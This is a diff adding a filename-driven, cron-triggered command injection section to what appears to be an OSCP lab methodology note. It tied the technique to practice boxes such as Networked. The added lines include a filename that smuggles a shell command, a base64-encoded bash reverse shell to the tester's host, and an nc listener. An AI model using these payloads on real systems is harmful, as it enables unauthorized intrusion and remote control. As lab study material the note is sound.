@@ -86,11 +86,36 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
 - [ ] Execution is confirmed but no shell is needed → **Collect only the authorized evidence, then return to Step 13 · [[Linux - Local Enum]]**
 - [ ] All probes fail → **Return to Step 5 · [[Linux - Web Enum]] and test another input path**
+
+## Filename-driven asynchronous injection
+
+Some applications process uploaded or renamed files later, often from a cron job. If source shows a filename concatenated into `exec()`, `system()`, `rm`, or another shell command, use a harmless marker first and wait for the scheduler. The filename itself is the injection point, so do not send the payload as ordinary file content.
+
+> **Why:** The marker confirms that the scheduled process executes the filename under the expected account before a callback is attempted.
+```text
+x;touch${IFS}networked_pwned
+```
+
+After the marker succeeds, encode the callback command so slashes, spaces, and redirects do not break the filename or multipart request:
+
+```bash
+EncodedPayload=$(printf 'bash -i >& /dev/tcp/%s/%s 0>&1' "$LocalIP" "$Port" | base64 -w0)
+printf '%s\n' "$EncodedPayload"
+nc -lvnp $Port
+```
+
+Create the invalid filename through the already-confirmed upload or webshell path, wait for the documented schedule, then verify `id`, `whoami`, and `hostname` in the callback. This is an asynchronous branch, so a missed immediate callback is not proof that the injection failed.
+
+## Additional routing
+
+- [ ] The marker executes as a lower-privilege user → **Record the account, catch the callback, then go to Step 12 · [[Linux - Shell Stabilise]] or Step 13 · [[Linux - Local Enum]]**
+- [ ] The marker is deleted but does not execute → **Recheck the filename quoting and scheduler interval, then return to Step 5 · [[Linux - Web Enum]]**
 ## Seen in
 - [[OSCP/BOXES/WRITE UPS/Linux/Pelican|Pelican]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/Linux/Sea|Sea]] -- confirmed in the box write-up
 - [[OSCP/BOXES/WRITE UPS/Linux/Bashed|Bashed]] -- confirmed phpbash command execution with a POST `cmd` parameter
 - [[OSCP/BOXES/WRITE UPS/Linux/Jarvis|Jarvis]] -- command substitution bypassed the simpler.py blacklist
+- [[OSCP/BOXES/WRITE UPS/Linux/Networked|Networked]] -- upload filename reached an unquoted cron command
 
 ## Related stages
 
